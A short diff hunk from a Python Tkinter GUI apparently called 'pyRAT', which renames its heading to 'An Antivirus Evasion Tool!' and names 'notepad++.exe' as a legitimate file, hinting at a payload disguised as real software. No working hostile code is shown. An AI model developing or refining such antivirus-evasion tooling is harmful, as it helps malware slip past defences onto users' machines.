@@ -239,7 +239,7 @@ if __name__ == "__main__":
         root.resizable(width=False, height=False)
         root.configure(bg='lightblue')
         var = StringVar()
-	heading = Label(root, text="\npyRAT: The AV Evader!", font=("arial", 20), bg='lightblue').pack()
+	heading = Label(root, text="\npyRAT: An Antivirus Evasion Tool!", font=("arial", 20), bg='lightblue').pack()
         label = Label(root, textvariable=var, font=("arial", 12),bg='lightblue').pack()
 	var.set("Just wait for it...")
         legit_file = 'notepad++.exe'
